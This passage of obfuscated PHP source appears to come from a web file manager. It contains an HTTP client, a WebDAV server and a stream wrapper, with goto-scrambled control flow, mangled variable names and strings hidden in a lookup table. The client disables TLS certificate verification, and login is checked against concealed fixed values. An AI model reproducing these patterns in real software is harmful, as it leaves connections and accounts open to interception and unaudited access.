$aåêåÔ¸íé =& $_SERVER[ì‹É]; if ($c¼ªÑÅšÛ†) { $this->setHeader($aåêåÔ¸íé[1681], $aåêåÔ¸íé[922] . $c¼ªÑÅšÛ† . $aåêåÔ¸íé[925]); } return $this->send($aåêåÔ¸íé[211], $eƒíÔø è„, $d©Ÿßì®Ş©); } protected function send($C¦ö±ñ¢£, $Bª…öóƒÑÌ, $fÁÉŒÜ…–ö = false, $fˆ½İÍ¢Š = false) { goto dø°œãÉ¸ä; BÏÅ‘—ÍçÍ: curl_setopt($f¦ò»¿É, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($f¦ò»¿É, CURLOPT_SSL_VERIFYHOST, !1); $bè¶°šâ±à = curl_exec($f¦ò»¿É); goto Cİ‚ÈßğäÈ; f¢ÔØ’À—¿: $this->setHeader($D’ê³¨Ò…‚); if ($fÁÉŒÜ…–ö) { $fÁÉŒÜ…–ö = $a¨ªŠÑÈùÆ[1693] . $fÁÉŒÜ…–ö; } if (!request_url_safe($Bª…öóƒÑÌ)) { return !1; } goto E¨œ“·øÄæ; Cİ‚ÈßğäÈ: $this->header = array(); return $bè¶°šâ±à; goto a×»«ŞåÑ¼; aİ×‘º®âÛ: curl_setopt($f¦ò»¿É, CURLOPT_HTTPHEADER, $this->header); curl_setopt($f¦ò»¿É, CURLOPT_RETURNTRANSFER, !0); curl_setopt($f¦ò»¿É, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto BÏÅ‘—ÍçÍ; E¨œ“·øÄæ: $f¦ò»¿É = curl_init($Bª…öóƒÑÌ); curl_setopt($f¦ò»¿É, CURLOPT_CUSTOMREQUEST, $C¦ö±ñ¢£); curl_setopt($f¦ò»¿É, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto aİ×‘º®âÛ; dø°œãÉ¸ä: $a¨ªŠÑÈùÆ =& $_SERVER[ì‹É]; $D’ê³¨Ò…‚ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($a¨ªŠÑÈùÆ[1692], $a¨ªŠÑÈùÆ[50]); goto f¢ÔØ’À—¿; a×»«ŞåÑ¼: } } class HttpDavServer { public function __construct($dœŒ†›Ÿ½, $c±ˆˆ²â¡ï) { $this->root = $dœŒ†›Ÿ½; $this->initPath($c±ˆˆ²â¡ï); $this->start(); } public function initPath($bè»Ëêˆ„«) { $c•Ûçí²©ƒ =& $_SERVER[ì‹É]; $b×ËäŒ‘ø« = rtrim($_SERVER[$c•Ûçí²©ƒ[1304]], $c•Ûçí²©ƒ[8]) . $c•Ûçí²©ƒ[8]; $this->urlBase = substr($b×ËäŒ‘ø«, 0, strpos($b×ËäŒ‘ø«, $bè»Ëêˆ„«) + 1); $this->urlBase = rtrim($this->urlBase, $c•Ûçí²©ƒ[8]) . $bè»Ëêˆ„«; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $côÚ¾¡ÆÆ =& $_SERVER[ì‹É]; $B’±·õ›‰Å = HttpAuth::get(); if ($B’±·õ›‰Å[$côÚ¾¡ÆÆ[527]] == $côÚ¾¡ÆÆ[1694] && $B’±·õ›‰Å[$côÚ¾¡ÆÆ[894]] == $côÚ¾¡ÆÆ[1695]) { return !0; } HttpAuth::error(); } public function start() { goto FŒ òò²ÓÜ; e¹·ñ¼ôš: if (!method_exists($this, $DÖÛ˜È™µ´)) { pr($DÖÛ˜È™µ´ . $c£®–Åğ‹Ù[1696]); die; } $DáâïÉƒ¼‘ = array($c£®–Åğ‹Ù[1697], $c£®–Åğ‹Ù[1698]); if (!in_array($DÖÛ˜È™µ´, $DáâïÉƒ¼‘) && !$this->pathExists($this->path)) { $E“À¦áö«ğ = array($c£®–Åğ‹Ù[1006] => 404); } else { $E“À¦áö«ğ = $this->{$DÖÛ˜È™µ´}(); } goto F¤©ÄİÒ·Å; F¤©ÄİÒ·Å: if (!$E“À¦áö«ğ) { return; } self::response($E“À¦áö«ğ); goto AéËŒ”¿Úµ; FŒ òò²ÓÜ: $c£®–Åğ‹Ù =& $_SERVER[ì‹É]; $this->checkUser(); $DÖÛ˜È™µ´ = $c£®–Åğ‹Ù[143] . HttpHeader::method(); goto e¹·ñ¼ôš; AéËŒ”¿Úµ: } public function pathGet($Eà¥ùÇˆ†Î = false) { $eÃÑ±£ñ =& $_SERVER[ì‹É]; $AˆŸÕ©‡„š = $Eà¥ùÇˆ†Î ? $_SERVER[$eÃÑ±£ñ[1699]] : $_SERVER[$eÃÑ±£ñ[1304]]; $AˆŸÕ©‡„š = KodIO::clear(rawurldecode($AˆŸÕ©‡„š)); if (!strstr($AˆŸÕ©‡„š, KodIO::clear($this->urlBase))) { return !1; } return substr($AˆŸÕ©‡„š, strpos($AˆŸÕ©‡„š, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($fá ’¶ ½à) { return file_exists($fá ’¶ ½à); } public function pathMkdir($FšÚ–¤ƒ¾Ö) { return mkdir($FšÚ–¤ƒ¾Ö, 511, !0); } public function pathInfo($Bƒ Ù‰ø¯”) { return path_info($Bƒ Ù‰ø¯”); } public function pathList($b‘—ÇÈª¤) { return path_list($b‘—ÇÈª¤); } public function pathOut($d´‰¼Ù«•²) { echo file_get_contents($d´‰¼Ù«•²); } public function pathPut($aîŒ¨¹›¼, $cÇ¥§¡…ö“ = '') { if (!$cÇ¥§¡…ö“) { return file_put_contents($aîŒ¨¹›¼, $_SERVER[ì‹É][33]); } return move_path($cÇ¥§¡…ö“, $aîŒ¨¹›¼); } public function pathRemove($DÔâ­‘ÊÙ) { if (is_file($DÔâ­‘ÊÙ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($fŞƒµÆ°È, $dî®Ü¨ù¤) { return move_path($fŞƒµÆ°È, $dî®Ü¨ù¤); } public function pathCopy($Eğ½‚àÁÀº, $d«Éğ°Ùœ) { return copy_dir($Eğ½‚àÁÀº, $d«Éğ°Ùœ); } public function parsePath($DŸ´…ĞÑ¤) { return $DŸ´…ĞÑ¤; } public function parseItem($DÌ† ğ”Âã, $BğÑ”Üª¯) { goto c¾†êˆ¶”·; d–™¥…Ç¦: $bë†é‹áğ = array($dÈ¬¹Ÿƒô›[1700] => KodIO::clear($this->urlBase . $BƒöØ˜“‘À), $dÈ¬¹Ÿƒô›[108] => @gmdate($dÈ¬¹Ÿƒô›[1701], $DÌ† ğ”Âã[$dÈ¬¹Ÿƒô›[108]]), $dÈ¬¹Ÿƒô›[184] => @gmdate($dÈ¬¹Ÿƒô›[1702], $DÌ† ğ”Âã[$dÈ¬¹Ÿƒô›[184]]), $dÈ¬¹Ÿƒô›[78] => $DÌ† ğ”Âã[$dÈ¬¹Ÿƒô›[78]] ? $DÌ† ğ”Âã[$dÈ¬¹Ÿƒô›[78]] : 0); return $bë†é‹áğ; goto B‹ï©î°Ò—; c¾†êˆ¶”·: $dÈ¬¹Ÿƒô› =& $_SERVER[ì‹É]; $BƒöØ˜“‘À = $this->pathGet() . $dÈ¬¹Ÿƒô›[8] . $DÌ† ğ”Âã[$dÈ¬¹Ÿƒô›[28]]; $BƒöØ˜“‘À = $dÈ¬¹Ÿƒô›[8] . str_replace($dÈ¬¹Ÿƒô›[169], $dÈ¬¹Ÿƒô›[8], rawurlencode($BƒöØ˜“‘À)); goto E†œÕ¹ÇëÜ; E†œÕ¹ÇëÜ: if ($BğÑ”Üª¯) { $BƒöØ˜“‘À = $dÈ¬¹Ÿƒô›[8] . str_replace($dÈ¬¹Ÿƒô›[169], $dÈ¬¹Ÿƒô›[8], rawurlencode($this->pathGet())); } if (!trim($DÌ† ğ”Âã[$dÈ¬¹Ÿƒô›[108]])) { $DÌ† ğ”Âã[$dÈ¬¹Ÿƒô›[108]] = time(); } if (!trim($DÌ† ğ”Âã[$dÈ¬¹Ÿƒô›[184]])) { $DÌ† ğ”Âã[$dÈ¬¹Ÿƒô›[184]] = time(); } goto d–™¥…Ç¦; B‹ï©î°Ò—: } public function parseItemXml($AÊ»ŠŒèè…, $EÓ°’í‹å®) { $dÆ¯¯”°à¶ =& $_SERVER[ì‹É]; $e©¶åŒÕ¶Ó = $this->parseItem($AÊ»ŠŒèè…, $EÓ°’í‹å®); if ($AÊ»ŠŒèè…[$dÆ¯¯”°à¶[29]] == $dÆ¯¯”°à¶[77]) { $Cõøƒ‡°‘© = $dÆ¯¯”°à¶[1703]; $Cõøƒ‡°‘© .= $dÆ¯¯”°à¶[1704]; } else { $d³›…ŠÆÈÒ = $AÊ»ŠŒèè…[$dÆ¯¯”°à¶[157]] ? $AÊ»ŠŒèè…[$dÆ¯¯”°à¶[157]] : get_path_ext($AÊ»ŠŒèè…[$dÆ¯¯”°à¶[28]]); $EÌİÕ„®à = get_file_mime($d³›…ŠÆÈÒ); $Cõøƒ‡°‘© = $dÆ¯¯”°à¶[1705]; $Cõøƒ‡°‘© .= "\74\104\72\x67\145\164\143\157\x6e\164\x65\156\x74\x74\x79\160\145\76{$EÌİÕ„®à}\x3c\x2f\104\72\147\x65\x74\x63\x6f\x6e\164\x65\x6e\164\x74\x79\x70\x65\x3e"; } return "\12\x9\x9\74\x44\72\162\x65\x73\x70\157\x6e\x73\x65\76\xa\11\x9\x9\x3c\104\x3a\150\162\145\146\x3e{$e©¶åŒÕ¶Ó[$dÆ¯¯”°à¶[1700]]}\74\x2f\x44\x3a\150\x72\145\146\76\xa\11\x9\x9\x3c\104\72\160\162\157\x70\163\164\x61\x74\x3e\12\11\11\11\11\74\x44\x3a\160\162\157\x70\x3e\xa\x9\x9\x9\11\11\74\x44\x3a\x67\145\164\x6c\x61\x73\164\x6d\x6f\x64\151\146\x69\145\x64\x3e{$e©¶åŒÕ¶Ó[$dÆ¯¯”°à¶[108]]}\x3c\57\x44\72\147\145\164\154\141\163\164\155\157\x64\x69\146\151\x65\144\x3e\xa\x9\11\x9\11\x9\x3c\x44\72\143\x72\145\141\x74\151\157\156\x64\141\x74\x65\x3e{$e©¶åŒÕ¶Ó[$dÆ¯¯”°à¶[184]]}\x3c\x2f\x44\72\x63\162\x65\x61\x74\151\157\156\144\141\164\x65\x3e\xa\11\x9\x9\x9\x9\74\104\x3a\x67\145\x74\143\157\156\164\145\x6e\164\x6c\x65\156\147\164\150\x3e{$e©¶åŒÕ¶Ó[$dÆ¯¯”°à¶[78]]}\74\57\104\x3a\147\x65\x74\x63\x6f\156\x74\145\156\164\x6c\145\156\147\x74\x68\76\xa\11\x9\11\11\x9{$Cõøƒ‡°‘©}\12\x9\x9\11\11\74\x2f\x44\72\x70\x72\157\x70\x3e\xa\x9\11\11\11\74\x44\72\x73\164\141\164\165\x73\x3e\x48\x54\124\120\57\61\x2e\61\x20\62\x30\60\40\x4f\113\x3c\57\104\x3a\163\x74\x61\x74\165\x73\76\xa\x9\x9\x9\74\57\x44\72\x70\x72\157\160\x73\164\141\x74\x3e\xa\x9\x9\x3c\x2f\104\x3a\x72\x65\x73\160\x6f\x6e\163\145\76"; } public function pathListMerge($EâÌ›¯ä•İ) { goto e“´‰Õï¬í; bçœ­„»Œ‹: return $e¶Í Åò÷Œ; goto d‹§ëæĞ†; A½‚‡®ïÂÛ: $e¶Í Åò÷Œ = array(); foreach ($EâÌ›¯ä•İ as $aï ÓÆµÜ‘ => $B²Üíõ‡®) { if (!in_array($aï ÓÆµÜ‘, $DË¨¨Ú©²‹) || !is_array($B²Üíõ‡®)) { continue; } $e¶Í Åò÷Œ = array_merge($e¶Í Åò÷Œ, $B²Üíõ‡®); } foreach ($e¶Í Åò÷Œ as &$A©¯‰§øŸ) { $A©¯‰§øŸ[$bê²À„¥‘‚[28]] = str_replace($bê²À„¥‘‚[8], $bê²À„¥‘‚[1306], $A©¯‰§øŸ[$bê²À„¥‘‚[28]]); } goto bçœ­„»Œ‹; e“´‰Õï¬í: $bê²À„¥‘‚ =& $_SERVER[ì‹É]; if (!$EâÌ›¯ä•İ) { return $EâÌ›¯ä•İ; } $DË¨¨Ú©²‹ = array($bê²À„¥‘‚[74], $bê²À„¥‘‚[75], $bê²À„¥‘‚[1706]); goto A½‚‡®ïÂÛ; d‹§ëæĞ†: } public function httpPROPFIND() { goto B¼åÌ‡¨­À; A·¤ÁåÅëÇ: return array($F¸‚ßÁ«šÏ[1709] => 207, $F¸‚ßÁ«šÏ[1710] => "\x3c\104\72\155\165\154\164\151\163\x74\141\164\x75\163\x20\170\x6d\154\156\x73\72\x44\x3d\x22\104\x41\126\72\x22\x3e\12{$a¼å²œá}\12\x3c\x2f\x44\72\x6d\165\154\164\x69\x73\164\141\164\x75\163\76"); goto b˜ÇòĞÉÜ¹; Bˆ¼öŞì„©: if ($CîŒğÀî¶) { $dë¡‘¹¥‹ = array($bÔæé‡‘´»); } else { $bÔæé‡‘´»[$F¸‚ßÁ«šÏ[28]] = $F¸‚ßÁ«šÏ[33]; $dë¡‘¹¥‹ = array_merge(array($bÔæé‡‘´»), $dë¡‘¹¥‹); } $a¼å²œá = $F¸‚ßÁ«šÏ[33]; foreach ($dë¡‘¹¥‹ as $Aé¤ğôÕ…) { $a¼å²œá .= $this->parseItemXml($Aé¤ğôÕ…, $CîŒğÀî¶); } goto A·¤ÁåÅëÇ; bÅ‰¢¢µãë: $bÔæé‡‘´» = $E œî‚’ÈÖ[$F¸‚ßÁ«šÏ[1707]]; if (!is_array($dë¡‘¹¥‹) || $bÔæé‡‘´»[$F¸‚ßÁ«šÏ[1708]] === !1) { return array($F¸‚ßÁ«šÏ[1709] => 404, $F¸‚ßÁ«šÏ[1710] => $F¸‚ßÁ«šÏ[1711]); } $CîŒğÀî¶ = $bÔæé‡‘´»[$F¸‚ßÁ«šÏ[29]] == $F¸‚ßÁ«šÏ[164] || HttpHeader::get($F¸‚ßÁ«šÏ[1686]) == $F¸‚ßÁ«šÏ[464]; goto Bˆ¼öŞì„©; B¼åÌ‡¨­À: $F¸‚ßÁ«šÏ =& $_SERVER[ì‹É]; $E œî‚’ÈÖ = $this->pathList($this->path); $dë¡‘¹¥‹ = $this->pathListMerge($E œî‚’ÈÖ); goto bÅ‰¢¢µãë; b˜ÇòĞÉÜ¹: } public function httpHEAD() { $dÕ¯ÛÇÌ‰„ =& $_SERVER[ì‹É]; $dÖŒ„î‰ğÛ = $this->pathInfo($this->path); if (!$dÖŒ„î‰ğÛ || $dÖŒ„î‰ğÛ[$dÕ¯ÛÇÌ‰„[29]] == $dÕ¯ÛÇÌ‰„[77]) { return array($dÕ¯ÛÇÌ‰„[1006] => 200, $dÕ¯ÛÇÌ‰„[1172] => array($dÕ¯ÛÇÌ‰„[1712])); } return array($dÕ¯ÛÇÌ‰„[1006] => 200, $dÕ¯ÛÇÌ‰„[1172] => array($dÕ¯ÛÇÌ‰„[1713], $dÕ¯ÛÇÌ‰„[137], $dÕ¯ÛÇÌ‰„[1714] . $dÖŒ„î‰ğÛ[$dÕ¯ÛÇÌ‰„[78]], $dÕ¯ÛÇÌ‰„[1715] . get_file_mime($dÖŒ„î‰ğÛ[$dÕ¯ÛÇÌ‰„[157]]), $dÕ¯ÛÇÌ‰„[133] . gmdate($dÕ¯ÛÇÌ‰„[1701], $dÖŒ„î‰ğÛ[$dÕ¯ÛÇÌ‰„[1215]]) . $dÕ¯ÛÇÌ‰„[1716], $dÕ¯ÛÇÌ‰„[1717])); } public function httpOPTIONS() { $bİ©òã…õù =& $_SERVER[ì‹É]; return array($bİ©òã…õù[1006] => 200, $bİ©òã…õù[1172] => array($bİ©òã…õù[1718], $bİ©òã…õù[1719], $bİ©òã…õù[1720], $bİ©òã…õù[1676])); } public function httpPROPPATCH() { $CÖåÅóùÛ =& $_SERVER[ì‹É]; $f½†«¬®Í = $CÖåÅóùÛ[1721] . $_SERVER[$CÖåÅóùÛ[1304]] . $CÖåÅóùÛ[1722]; return array($CÖåÅóùÛ[1709] => 207, $CÖåÅóùÛ[1710] => "\x3c\x44\72\x6d\x75\x6c\x74\151\163\x74\141\x74\x75\163\40\x78\155\154\156\x73\x3a\x44\x3d\42\104\101\x56\72\x22\x3e\12{$f½†«¬®Í}\xa\74\x2f\x44\72\155\165\154\164\151\x73\x74\x61\164\165\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $dÃİˆ•äñº =& $_SERVER[ì‹É]; $CêƒÔÓƒíë = $this->uploadFile(); if ($CêƒÔÓƒíë) { $A‹‹—™òÊê = 204; } else { $CêƒÔÓƒíë = $dÃİˆ•äñº[33]; $A‹‹—™òÊê = 201; } $E”Ÿª­¦§ = $this->pathPut($this->path, $CêƒÔÓƒíë); if ($E”Ÿª­¦§ == !1) { $A‹‹—™òÊê = 404; } return array($dÃİˆ•äñº[1709] => $A‹‹—™òÊê); } private function uploadFile() { goto FïœµƒÄÃ¤; FïœµƒÄÃ¤: $a½Åô–˜ =& $_SERVER[ì‹É]; @mk_dir(TEMP_FILES); $aï›÷ä§Üİ = TEMP_FILES . $a½Åô–˜[1723] . rand_string(32); goto bƒº·ø’Â; c‡©ø‰¦Õ: if (@filesize($aï›÷ä§Üİ) > 0) { return $aï›÷ä§Üİ; } @unlink($aï›÷ä§Üİ); return !1; goto A¢¨ÈŸò¸Ü; EåáÖÖ‹—š: while (!feof($Aò•³ÔŸ¼ƒ)) { fwrite($f§šìŸ³²ö, fread($Aò•³ÔŸ¼ƒ, 1024 * 200)); } fclose($Aò•³ÔŸ¼ƒ); fclose($f§šìŸ³²ö); goto c‡©ø‰¦Õ; bƒº·ø’Â: $f§šìŸ³²ö = @fopen($aï›÷ä§Üİ, $a½Åô–˜[1431]); $Aò•³ÔŸ¼ƒ = @fopen($a½Åô–˜[1724], $a½Åô–˜[1430]); if (!$Aò•³ÔŸ¼ƒ || !$f§šìŸ³²ö) { @unlink($aï›÷ä§Üİ); return !1; } goto EåáÖÖ‹—š; A¢¨ÈŸò¸Ü: } public function httpMKCOL() { $bÙ‡Òùù› =& $_SERVER[ì‹É]; if ($this->pathExists($this->path)) { return array($bÙ‡Òùù›[1006] => 409); } $cÖ¡‚—«³µ = $this->pathMkdir($this->path); return array($bÙ‡Òùù›[1006] => $cÖ¡‚—«³µ ? 201 : 403); } public function httpMOVE() { $aµÒÇ³æ‚‘ =& $_SERVER[ì‹É]; $ešŠŠ¶»…¤ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$aµÒÇ³æ‚‘[1725]])) { $eªî¹ â÷Ø[$aµÒÇ³æ‚‘[1726]] = $_SERVER[$aµÒÇ³æ‚‘[1725]] == $aµÒÇ³æ‚‘[1727]; } $bÊ‘×‰¸“ø = $this->pathMove($this->path, $ešŠŠ¶»…¤); return array($aµÒÇ³æ‚‘[1006] => $bÊ‘×‰¸“ø ? 201 : 404); } public function httpCOPY() { $cÒ³‘âŠ‡„ = $this->parsePath($this->pathGet(!0)); $D¾†…³İ£— = $this->pathCopy($this->path, $cÒ³‘âŠ‡„); return array($_SERVER[ì‹É][1006] => $D¾†…³İ£— ? 201 : 404); } public function httpDELETE() { $aææòì´°Ü = $this->pathRemove($this->path); return array($_SERVER[ì‹É][1006] => $aææòì´°Ü ? 200 : 503); } public function httpLOCK() { $B›ƒ„¹±² =& $_SERVER[ì‹É]; $FŠ’õø«†¾ = md5($this->path); $d¸˜„„ÀÁ® = $B›ƒ„¹±²[1728] . $this->xmlGet($B›ƒ„¹±²[1729]) . $B›ƒ„¹±²[1730] . $FŠ’õø«†¾ . $B›ƒ„¹±²[1731]; return array($B›ƒ„¹±²[1006] => 200, $B›ƒ„¹±²[1172] => array($B›ƒ„¹±²[1732] . $FŠ’õø«†¾, $B›ƒ„¹±²[1733]), $B›ƒ„¹±²[1734] => $d¸˜„„ÀÁ®); } public function httpUNLOCK() { return array($_SERVER[ì‹É][1006] => 204); } public function xmlGet($dÔšïàÛÖ£) { goto c£á˜øÊÑ; FåÚ´¿‰¡‹: $D’’ÄÜ½¶ë = array_shift(explode($Eë™‚¾ö[8], $dÔšïàÛÖ£)); $cèç‘Õ‰“Ê = $DŞÃÖÉÍÛÎ->getElementsByTagNameNS($Eë™‚¾ö[1736], $D’’ÄÜ½¶ë); if ($cèç‘Õ‰“Ê) { return $cèç‘Õ‰“Ê[0]->nodeValue; } goto Bë–×ÉåÖ; Bë–×ÉåÖ: return $Eë™‚¾ö[33]; goto eî£®ï÷”“; c£á˜øÊÑ: $Eë™‚¾ö =& $_SERVER[ì‹É]; static $DŞÃÖÉÍÛÎ = false; if (!$DŞÃÖÉÍÛÎ) { $cŸó¯¥ßÏè = file_get_contents($Eë™‚¾ö[1735]); $DŞÃÖÉÍÛÎ = new DOMDocument(); $DŞÃÖÉÍÛÎ->loadXML($cŸó¯¥ßÏè); } goto FåÚ´¿‰¡‹; eî£®ï÷”“: } public static function response($fÊ¸±›Ã¸Ÿ) { goto Dë©‰¡ï¦; c„ç³ñ…ó²: $f‹ãøã¢¢Û[] = $EÁ‘ŸÙ®ªç[1674]; $f‹ãøã¢¢Û[] = $EÁ‘ŸÙ®ªç[1675]; foreach ($f‹ãøã¢¢Û as $E•šäƒ¬í) { header($E•šäƒ¬í); } goto d†ÔöÕÊ² ; Dë©‰¡ï¦: $EÁ‘ŸÙ®ªç =& $_SERVER[ì‹É]; $f‹ãøã¢¢Û = is_array($fÊ¸±›Ã¸Ÿ[$EÁ‘ŸÙ®ªç[1172]]) ? $fÊ¸±›Ã¸Ÿ[$EÁ‘ŸÙ®ªç[1172]] : array(); $f‹ãøã¢¢Û[] = HttpHeader::code($fÊ¸±›Ã¸Ÿ[$EÁ‘ŸÙ®ªç[1006]]); goto c„ç³ñ…ó²; d†ÔöÕÊ² : if (is_string($fÊ¸±›Ã¸Ÿ[$EÁ‘ŸÙ®ªç[1734]])) { header($EÁ‘ŸÙ®ªç[1737]); $E¥«¯‘‹Î = $EÁ‘ŸÙ®ªç[1738] . $EÁ‘ŸÙ®ªç[214] . $fÊ¸±›Ã¸Ÿ[$EÁ‘ŸÙ®ªç[1734]]; echo $E¥«¯‘‹Î; } goto b‚›„°¯ÓÕ; b‚›„°¯ÓÕ: } } goto CÌª°Î‘É; fîš‹âˆˆ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($aŸ¼„¼¢À¢, $e‹¯–òìÏŒ = '') { goto f¿ä‚ÂëŠ; f¿ä‚ÂëŠ: $this->info = $this->info($aŸ¼„¼¢À¢); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ì‹É][76]]; goto cçŒĞˆŒ“; aÓ…“¿¦äî: return $this->info ? !0 : !1; goto FØÆ†È´„; cçŒĞˆŒ“: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$aŸ¼„¼¢À¢])) { self::$_chunkBuffer[$aŸ¼„¼¢À¢] = array(); } goto aÓ…“¿¦äî; FØÆ†È´„: } function stream_read($AÑß“³á¡¥) { $aˆõğ®º = $this->fileSubstr($this->pose, $AÑß“³á¡¥); $this->pose += strlen($aˆõğ®º); return $aˆõğ®º; } public function stream_tell() { return $this->pose; } public function stream_seek($cç…”çâ¼, $b¸¢»Ê¿¢) { $a‹ÃäºÙ =& $_SERVER[ì‹É]; if ($b¸¢»Ê¿¢ == SEEK_SET) { $this->pose = $cç…”çâ¼; } else { if ($b¸¢»Ê¿¢ == SEEK_CUR) { $this->pose += $cç…”çâ¼; } else { if ($b¸¢»Ê¿¢ == SEEK_END) { $this->pose = $this->info[$a‹ÃäºÙ[78]] + intval($cç…”çâ¼); } } } if ($cç…”çâ¼ < 0) { $this->pose = $this->info[$a‹ÃäºÙ[78]] + $cç…”çâ¼; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ì‹É][78]]; } public function stream_close() { return !0; } public function url_stat($fÒµøŸùƒ, $C…Õƒ¦Ï¥) { $c ËæÚÀ¯Î =& $_SERVER[ì‹É]; $dÆÓš…¥’å = $this->info($fÒµøŸùƒ); return array($c ËæÚÀ¯Î[1208] => 0, $c ËæÚÀ¯Î[1209] => 0, $c ËæÚÀ¯Î[12] => 32768 + 511, $c ËæÚÀ¯Î[1210] => 0, $c ËæÚÀ¯Î[1211] => 0, $c ËæÚÀ¯Î[1212] => 0, $c ËæÚÀ¯Î[1213] => 0, $c ËæÚÀ¯Î[78] => $dÆÓš…¥’å[$c ËæÚÀ¯Î[78]], $c ËæÚÀ¯Î[1214] => $dÆÓš…¥’å[$c ËæÚÀ¯Î[1132]], $c ËæÚÀ¯Î[1215] => $dÆÓš…¥’å[$c ËæÚÀ¯Î[108]], $c ËæÚÀ¯Î[1216] => $dÆÓš…¥’å[$c ËæÚÀ¯Î[184]], $c ËæÚÀ¯Î[1217] => 0, $c ËæÚÀ¯Î[1218] => 0); } static $fileInfo = array(); public function info($Eè•¯’Ö·) { $C´óåŠçÊÔ = $_SERVER[ì‹É][1219]; if (isset(self::$fileInfo[$Eè•¯’Ö·])) { return self::$fileInfo[$Eè•¯’Ö·]; } if (substr($Eè•¯’Ö·, 0, strlen($C´óåŠçÊÔ)) != $C´óåŠçÊÔ) { return !1; } self::$fileInfo[$Eè•¯’Ö·] = IO::info(substr($Eè•¯’Ö·, strlen($C´óåŠçÊÔ))); return self::$fileInfo[$Eè•¯’Ö·]; } public static function read($fˆæ«Ä‚Â“, $eƒ—îƒôëø, $Eµ›ÂœÒ‰Ò) { goto Cš‰¡ˆáÚ¦; cªÆ¸¡ğ£¤: return $eéäÛ¾øÜÕ; goto B•±É¥ŠÙ¢; Cš‰¡ˆáÚ¦: $EÆ‚ôŠ¬ë¥ =& $_SERVER[ì‹É]; $aİÄ‰†¦ƒƒ = fopen($fˆæ«Ä‚Â“, $EÆ‚ôŠ¬ë¥[1134]); if (!$aİÄ‰†¦ƒƒ) { return $EÆ‚ôŠ¬ë¥[33]; } goto d¸ÌŠë™¢İ; d¸ÌŠë™¢İ: $d¦á´ß¶àà = 8192; fseek($aİÄ‰†¦ƒƒ, $eƒ—îƒôëø, SEEK_SET); $eéäÛ¾øÜÕ = $EÆ‚ôŠ¬ë¥[33]; goto c˜’ËÈÛøÚ; c˜’ËÈÛøÚ: $bßÃÉñ¬ = 0; while ($bßÃÉñ¬ < $Eµ›ÂœÒ‰Ò) { $cœ‡‹È“ß = min($d¦á´ß¶àà, $Eµ›ÂœÒ‰Ò - $bßÃÉñ¬); $eéäÛ¾øÜÕ .= fread($aİÄ‰†¦ƒƒ, $cœ‡‹È“ß); $bßÃÉñ¬ += $cœ‡‹È“ß; } fclose($aİÄ‰†¦ƒƒ); goto cªÆ¸¡ğ£¤; B•±É¥ŠÙ¢: } public function fileSubstr($AğËŠªá°Ô, $E‰ØÍ˜ á´) { goto CÉƒš¶Úß½; CÉƒš¶Úß½: $Cª»¸óÃªí =& $_SERVER[ì‹É]; $BšØ„è”ÛÑ = $this->info[$Cª»¸óÃªí[78]]; $D°‡¡¾Á = $AğËŠªá°Ô; goto b©ã©ÄÌ«; b©ã©ÄÌ«: $A­Ï¨ÊëÍé = $E‰ØÍ˜ á´; if ($AğËŠªá°Ô < 0) { $AğËŠªá°Ô = $BšØ„è”ÛÑ + $AğËŠªá°Ô; } if ($E‰ØÍ˜ á´ === !1) { $E‰ØÍ˜ á´ = $BšØ„è”ÛÑ - $AğËŠªá°Ô; } goto E°¦†šÍ¿‹; Dé¬ÔäÔÁµ: foreach ($a•Àˆ’ëê as $DÒÁ‘¶Æ¯í => $fÊì·¿¦š¹) { $DÒÁ‘¶Æ¯í = intval($DÒÁ‘¶Æ¯í); $fŠ­’”¢ï = $DÒÁ‘¶Æ¯í + strlen($fÊì·¿¦š¹); if ($AğËŠªá°Ô >= $fŠ­’”¢ï) { continue; } if ($AğËŠªá°Ô >= $DÒÁ‘¶Æ¯í && $AğËŠªá°Ô + $E‰ØÍ˜ á´ <= $fŠ­’”¢ï) { return substr($fÊì·¿¦š¹, $AğËŠªá°Ô - $DÒÁ‘¶Æ¯í, $E‰ØÍ˜ á´); } break; } if (count($a•Àˆ’ëê) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Cª»¸óÃªí[1220], $Cª»¸óÃªí[1221] . count($a•Àˆ’ëê) . "\x3b\x73\x74\x61\x72\164\x3d{$AğËŠªá°Ô}\x2c\x6c\x65\156\147\x74\150\75{$E‰ØÍ˜ á´}\x3b\x70\157\x73\145\72{$DÒÁ‘¶Æ¯í}\176{$fŠ­’”¢ï}"); throw new Exception($Cª»¸óÃªí[1222]); } $aŒè Ùã²› = intval($AğËŠªá°Ô / $eƒ£Šñì²Ö) * $eƒ£Šñì²Ö; goto DçÈÛÄÏİê; bóéÌÁŞÓ¹: ksort($a•Àˆ’ëê); $F”ï»ÔªÕš = substr($Fï›ßï³Ôì, $AğËŠªá°Ô - $aŒè Ùã²›, $E‰ØÍ˜ á´); return $F”ï»ÔªÕš; goto f§íôÌ‰ˆ‡; c„É·–Ş‡ç: $DÒÁ‘¶Æ¯í = 0; $fŠ­’”¢ï = 0; $fÊì·¿¦š¹ = $Cª»¸óÃªí[33]; goto Dé¬ÔäÔÁµ; DçÈÛÄÏİê: $d ©Ìçé‡ª = ceil(($AğËŠªá°Ô + $E‰ØÍ˜ á´) / $eƒ£Šñì²Ö) * $eƒ£Šñì²Ö - $aŒè Ùã²›; $Fï›ßï³Ôì = IO::fileSubstr($this->path, $aŒè Ùã²›, $d ©Ìçé‡ª); $a•Àˆ’ëê[$aŒè Ùã²› . $Cª»¸óÃªí[33]] = $Fï›ßï³Ôì; goto bóéÌÁŞÓ¹; bÎ°•ö°…: $eƒ£Šñì²Ö = 64 * 1024; $a•Àˆ’ëê =& self::$_chunkBuffer[$this->path]; if (!$a•Àˆ’ëê) { $a•Àˆ’ëê = array(); } goto 